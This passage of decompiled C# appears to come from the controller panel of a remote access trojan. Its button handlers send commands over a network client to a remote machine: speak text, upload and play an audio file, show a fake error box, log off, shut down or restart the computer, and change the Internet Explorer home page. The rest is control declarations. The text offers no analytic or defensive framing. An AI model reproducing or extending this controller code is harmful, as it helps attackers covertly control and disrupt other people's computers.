		{
			this.s.Send("peech" + Class7.string_1 + this.TextBox4.Text);
		}

		// Token: 0x060002CC RID: 716 RVA: 0x0015FB98 File Offset: 0x0015DF98
		private void Button56_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				FileInfo fileInfo = new FileInfo(openFileDialog.FileName);
				NewLateBinding.LateCall(this.s, null, "Send", new object[] { Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("sendmusicplay", MyProject.Forms.Form1.Yy), fileInfo.Name), MyProject.Forms.Form1.Yy), Convert.ToBase64String(File.ReadAllBytes(openFileDialog.FileName))) }, null, null, null, true);
			}
		}

		// Token: 0x17000108 RID: 264
		// (get) Token: 0x060002CD RID: 717 RVA: 0x0015FC38 File Offset: 0x0015E038
		public object title
		{
			get
			{
				return this.TextBox6.Text;
			}
		}

		// Token: 0x17000109 RID: 265
		// (get) Token: 0x060002CE RID: 718 RVA: 0x0015FC58 File Offset: 0x0015E058
		public object message
		{
			get
			{
				return this.TextBox5.Text;
			}
		}

		// Token: 0x1700010A RID: 266
		// (get) Token: 0x060002CF RID: 719 RVA: 0x0015FC78 File Offset: 0x0015E078
		public object messageicon
		{
			get
			{
				bool flag = this.RadioButton1.Checked;
				object obj;
				if (flag)
				{
					obj = "1";
				}
				else
				{
					flag = this.RadioButton2.Checked;
					if (flag)
					{
						obj = "2";
					}
					else
					{
						flag = this.RadioButton3.Checked;
						if (flag)
						{
							obj = "3";
						}
						else
						{
							flag = this.RadioButton4.Checked;
							if (flag)
							{
								obj = "4";
							}
							else
							{
								obj = "1";
							}
						}
					}
				}
				return obj;
			}
		}

		// Token: 0x1700010B RID: 267
		// (get) Token: 0x060002D0 RID: 720 RVA: 0x0015FCF8 File Offset: 0x0015E0F8
		public object messagebutton
		{
			get
			{
				bool flag = this.RadioButton5.Checked;
				object obj;
				if (flag)
				{
					obj = "1";
				}
				else
				{
					flag = this.RadioButton6.Checked;
					if (flag)
					{
						obj = "2";
					}
					else
					{
						flag = this.RadioButton7.Checked;
						if (flag)
						{
							obj = "3";
						}
						else
						{
							flag = this.RadioButton8.Checked;
							if (flag)
							{
								obj = "4";
							}
							else
							{
								flag = this.RadioButton9.Checked;
								if (flag)
								{
									obj = "5";
								}
								else
								{
									flag = this.RadioButton10.Checked;
									if (flag)
									{
										obj = "6";
									}
									else
									{
										obj = "1";
									}
								}
							}
						}
					}
				}
				return obj;
			}
		}

		// Token: 0x060002D1 RID: 721 RVA: 0x0015FDB0 File Offset: 0x0015E1B0
		private void Button39_Click(object sender, EventArgs e)
		{
			NewLateBinding.LateCall(this.s, null, "Send", new object[] { Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("ErorrMsg", MyProject.Forms.Form1.Yy), this.messageicon), MyProject.Forms.Form1.Yy), this.messagebutton), MyProject.Forms.Form1.Yy), this.title), MyProject.Forms.Form1.Yy), this.message) }, null, null, null, true);
		}

		// Token: 0x060002D2 RID: 722 RVA: 0x0015FE64 File Offset: 0x0015E264
		private void Button38_Click(object sender, EventArgs e)
		{
			bool flag = this.RadioButton1.Checked;
			MessageBoxIcon messageBoxIcon;
			if (flag)
			{
				messageBoxIcon = MessageBoxIcon.Asterisk;
			}
			else
			{
				flag = this.RadioButton2.Checked;
				if (flag)
				{
					messageBoxIcon = MessageBoxIcon.Question;
				}
				else
				{
					flag = this.RadioButton3.Checked;
					if (flag)
					{
						messageBoxIcon = MessageBoxIcon.Exclamation;
					}
					else
					{
						flag = this.RadioButton4.Checked;
						if (flag)
						{
							messageBoxIcon = MessageBoxIcon.Hand;
						}
						else
						{
							messageBoxIcon = MessageBoxIcon.Asterisk;
						}
					}
				}
			}
			flag = this.RadioButton5.Checked;
			MessageBoxButtons messageBoxButtons;
			if (flag)
			{
				messageBoxButtons = MessageBoxButtons.YesNo;
			}
			else
			{
				flag = this.RadioButton6.Checked;
				if (flag)
				{
					messageBoxButtons = MessageBoxButtons.YesNoCancel;
				}
				else
				{
					flag = this.RadioButton7.Checked;
					if (flag)
					{
						messageBoxButtons = MessageBoxButtons.OK;
					}
					else
					{
						flag = this.RadioButton8.Checked;
						if (flag)
						{
							messageBoxButtons = MessageBoxButtons.OKCancel;
						}
						else
						{
							flag = this.RadioButton9.Checked;
							if (flag)
							{
								messageBoxButtons = MessageBoxButtons.RetryCancel;
							}
							else
							{
								flag = this.RadioButton10.Checked;
								if (flag)
								{
									messageBoxButtons = MessageBoxButtons.AbortRetryIgnore;
								}
								else
								{
									messageBoxButtons = MessageBoxButtons.OK;
								}
							}
						}
					}
				}
			}
			MessageBox.Show(this.TextBox5.Text, this.TextBox6.Text, messageBoxButtons, messageBoxIcon);
		}

		// Token: 0x060002D3 RID: 723 RVA: 0x0015FF5C File Offset: 0x0015E35C
		private void Button6_Click(object sender, EventArgs e)
		{
			this.s.Send("logoff");
		}

		// Token: 0x060002D4 RID: 724 RVA: 0x0015FF74 File Offset: 0x0015E374
		private void Button7_Click(object sender, EventArgs e)
		{
			this.s.Send("shutdowncomputer");
		}

		// Token: 0x060002D5 RID: 725 RVA: 0x0015FF8C File Offset: 0x0015E38C
		private void Button5_Click(object sender, EventArgs e)
		{
			this.s.Send("restartcomputer");
		}

		// Token: 0x060002D6 RID: 726 RVA: 0x0015FFA4 File Offset: 0x0015E3A4
		private void Button34_Click(object sender, EventArgs e)
		{
			NewLateBinding.LateCall(this.s, null, "Send", new object[] { Operators.ConcatenateObject(Operators.ConcatenateObject("IEhome", MyProject.Forms.Form1.Yy), this.TextBox1.Text) }, null, null, null, true);
		}

		// Token: 0x060002D7 RID: 727 RVA: 0x00160000 File Offset: 0x0015E400
		private void Button53_Click(object sender, EventArgs e)
		{
			this.Panel2.Visible = false;
			this.Panel1.Visible = true;
		}

		// Token: 0x060002D8 RID: 728 RVA: 0x00160020 File Offset: 0x0015E420
		private void Button55_Click(object sender, EventArgs e)
		{
			this.Panel1.Visible = false;
			this.Panel2.Visible = true;
		}

		// Token: 0x040000EC RID: 236
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x040000EE RID: 238
		[AccessedThroughProperty("ImageList1")]
		private ImageList _ImageList1;

		// Token: 0x040000EF RID: 239
		[AccessedThroughProperty("GroupBox7")]
		private GroupBox _GroupBox7;

		// Token: 0x040000F0 RID: 240
		[AccessedThroughProperty("Button14")]
		private Button _Button14;

		// Token: 0x040000F1 RID: 241
		[AccessedThroughProperty("Button15")]
		private Button _Button15;

		// Token: 0x040000F2 RID: 242
		[AccessedThroughProperty("GroupBox2")]
		private GroupBox _GroupBox2;

		// Token: 0x040000F3 RID: 243
		[AccessedThroughProperty("Button3")]
		private Button _Button3;

		// Token: 0x040000F4 RID: 244
		[AccessedThroughProperty("Button4")]
		private Button _Button4;

		// Token: 0x040000F5 RID: 245
		[AccessedThroughProperty("GroupBox8")]
		private GroupBox _GroupBox8;

		// Token: 0x040000F6 RID: 246
		[AccessedThroughProperty("Button16")]
		private Button _Button16;

		// Token: 0x040000F7 RID: 247
		[AccessedThroughProperty("Button17")]
		private Button _Button17;

		// Token: 0x040000F8 RID: 248
		[AccessedThroughProperty("GroupBox6")]
		private GroupBox _GroupBox6;

		// Token: 0x040000F9 RID: 249
		[AccessedThroughProperty("Button22")]
		private Button _Button22;

		// Token: 0x040000FA RID: 250
		[AccessedThroughProperty("Button23")]
		private Button _Button23;

		// Token: 0x040000FB RID: 251
		[AccessedThroughProperty("GroupBox1")]
		private GroupBox _GroupBox1;

		// Token: 0x040000FC RID: 252
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x040000FD RID: 253
		[AccessedThroughProperty("Button2")]
		private Button _Button2;

		// Token: 0x040000FE RID: 254
		[AccessedThroughProperty("GroupBox10")]
		private GroupBox _GroupBox10;

		// Token: 0x040000FF RID: 255
		[AccessedThroughProperty("Button19")]
		private Button _Button19;

		// Token: 0x04000100 RID: 256
		[AccessedThroughProperty("Button18")]
		private Button _Button18;

		// Token: 0x04000101 RID: 257
		[AccessedThroughProperty("GroupBox9")]
		private GroupBox _GroupBox9;

		// Token: 0x04000102 RID: 258
		[AccessedThroughProperty("Button12")]
		private Button _Button12;

		// Token: 0x04000103 RID: 259
		[AccessedThroughProperty("Button13")]
		private Button _Button13;

		// Token: 0x04000104 RID: 260
		[AccessedThroughProperty("GroupBox11")]
		private GroupBox _GroupBox11;

		// Token: 0x04000105 RID: 261
		[AccessedThroughProperty("Button21")]
		private Button _Button21;

		// Token: 0x04000106 RID: 262
		[AccessedThroughProperty("Button20")]
		private Button _Button20;

		// Token: 0x04000107 RID: 263
		[AccessedThroughProperty("GroupBox25")]
		private GroupBox _GroupBox25;

		// Token: 0x04000108 RID: 264
		[AccessedThroughProperty("Button28")]
		private Button _Button28;

		// Token: 0x04000109 RID: 265
		[AccessedThroughProperty("Button29")]
		private Button _Button29;

		// Token: 0x0400010A RID: 266
		[AccessedThroughProperty("GroupBox19")]
		private GroupBox _GroupBox19;

		// Token: 0x0400010B RID: 267
		[AccessedThroughProperty("Button37")]
		private Button _Button37;

		// Token: 0x0400010C RID: 268
		[AccessedThroughProperty("Button36")]
		private Button _Button36;

		// Token: 0x0400010D RID: 269
		[AccessedThroughProperty("TextBox4")]
		private TextBox _TextBox4;

		// Token: 0x0400010E RID: 270
		[AccessedThroughProperty("Button56")]
		private Button _Button56;

		// Token: 0x0400010F RID: 271
		[AccessedThroughProperty("GroupBox18")]
		private GroupBox _GroupBox18;

		// Token: 0x04000110 RID: 272
		[AccessedThroughProperty("Button40")]
		private Button _Button40;

		// Token: 0x04000111 RID: 273
		[AccessedThroughProperty("Button41")]
		private Button _Button41;

		// Token: 0x04000112 RID: 274
		[AccessedThroughProperty("Button42")]
		private Button _Button42;

		// Token: 0x04000113 RID: 275
		[AccessedThroughProperty("Button43")]
		private Button _Button43;

		// Token: 0x04000114 RID: 276
		[AccessedThroughProperty("Button44")]
		private Button _Button44;

		// Token: 0x04000115 RID: 277
		[AccessedThroughProperty("Button45")]
		private Button _Button45;

		// Token: 0x04000116 RID: 278
		[AccessedThroughProperty("Button46")]
		private Button _Button46;

		// Token: 0x04000117 RID: 279
		[AccessedThroughProperty("Button47")]
		private Button _Button47;

		// Token: 0x04000118 RID: 280
		[AccessedThroughProperty("Button48")]
		private Button _Button48;

		// Token: 0x04000119 RID: 281
		[AccessedThroughProperty("Button49")]
		private Button _Button49;

		// Token: 0x0400011A RID: 282
		[AccessedThroughProperty("Button50")]
		private Button _Button50;

		// Token: 0x0400011B RID: 283
		[AccessedThroughProperty("Button51")]
		private Button _Button51;

		// Token: 0x0400011C RID: 284
		[AccessedThroughProperty("Button52")]
		private Button _Button52;

		// Token: 0x0400011D RID: 285
		[AccessedThroughProperty("Check_Sound")]
		private CheckBox _Check_Sound;

		// Token: 0x0400011E RID: 286
		[AccessedThroughProperty("GroupBox20")]
		private GroupBox _GroupBox20;

		// Token: 0x0400011F RID: 287
		[AccessedThroughProperty("RadioButton10")]
		private RadioButton _RadioButton10;

		// Token: 0x04000120 RID: 288
		[AccessedThroughProperty("RadioButton9")]
		private RadioButton _RadioButton9;

		// Token: 0x04000121 RID: 289
		[AccessedThroughProperty("RadioButton8")]
		private RadioButton _RadioButton8;

		// Token: 0x04000122 RID: 290
		[AccessedThroughProperty("RadioButton7")]
		private RadioButton _RadioButton7;

		// Token: 0x04000123 RID: 291
		[AccessedThroughProperty("RadioButton6")]
		private RadioButton _RadioButton6;

		// Token: 0x04000124 RID: 292
		[AccessedThroughProperty("RadioButton5")]
		private RadioButton _RadioButton5;

		// Token: 0x04000125 RID: 293
		[AccessedThroughProperty("GroupBox22")]
		private GroupBox _GroupBox22;

		// Token: 0x04000126 RID: 294
		[AccessedThroughProperty("RadioButton4")]
		private RadioButton _RadioButton4;

		// Token: 0x04000127 RID: 295
		[AccessedThroughProperty("PictureBox4")]
		private PictureBox _PictureBox4;

		// Token: 0x04000128 RID: 296
		[AccessedThroughProperty("RadioButton3")]
		private RadioButton _RadioButton3;

		// Token: 0x04000129 RID: 297
		[AccessedThroughProperty("PictureBox3")]
		private PictureBox _PictureBox3;

		// Token: 0x0400012A RID: 298
		[AccessedThroughProperty("RadioButton2")]
		private RadioButton _RadioButton2;

		// Token: 0x0400012B RID: 299
		[AccessedThroughProperty("PictureBox2")]
		private PictureBox _PictureBox2;

		// Token: 0x0400012C RID: 300
		[AccessedThroughProperty("RadioButton1")]
		private RadioButton _RadioButton1;

		// Token: 0x0400012D RID: 301
		[AccessedThroughProperty("PictureBox1")]
		private PictureBox _PictureBox1;

		// Token: 0x0400012E RID: 302
		[AccessedThroughProperty("GroupBox21")]
		private GroupBox _GroupBox21;

		// Token: 0x0400012F RID: 303
		[AccessedThroughProperty("TextBox5")]
		private TextBox _TextBox5;

		// Token: 0x04000130 RID: 304
		[AccessedThroughProperty("TextBox6")]
		private TextBox _TextBox6;

		// Token: 0x04000131 RID: 305
		[AccessedThroughProperty("Button39")]
		private Button _Button39;

		// Token: 0x04000132 RID: 306
		[AccessedThroughProperty("Button38")]
		private Button _Button38;

		// Token: 0x04000133 RID: 307
		[AccessedThroughProperty("Panel1")]
		private Panel _Panel1;

		// Token: 0x04000134 RID: 308
		[AccessedThroughProperty("Panel2")]
		private Panel _Panel2;

		// Token: 0x04000135 RID: 309
		[AccessedThroughProperty("Panel4")]
		private Panel _Panel4;

		// Token: 0x04000136 RID: 310
		[AccessedThroughProperty("Button53")]
		private Button _Button53;

		// Token: 0x04000137 RID: 311
		[AccessedThroughProperty("Panel6")]
		private Panel _Panel6;

		// Token: 0x04000138 RID: 312
		[AccessedThroughProperty("Button55")]
		private Button _Button55;

		// Token: 0x04000139 RID: 313
		[AccessedThroughProperty("Panel7")]
		private Panel _Panel7;

		// Token: 0x0400013A RID: 314
		[AccessedThroughProperty("GroupBox16")]
		private GroupBox _GroupBox16;

		// Token: 0x0400013B RID: 315
		[AccessedThroughProperty("Button34")]
		private Button _Button34;

		// Token: 0x0400013C RID: 316
		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		// Token: 0x0400013D RID: 317
		[AccessedThroughProperty("GroupBox3")]
		private GroupBox _GroupBox3;

		// Token: 0x0400013E RID: 318
		[AccessedThroughProperty("Button5")]
		private Button _Button5;

		// Token: 0x0400013F RID: 319
		[AccessedThroughProperty("Button6")]
		private Button _Button6;

		// Token: 0x04000140 RID: 320
		[AccessedThroughProperty("Button7")]
		private Button _Button7;

		// Token: 0x04000141 RID: 321
		public Client s;
	}
}
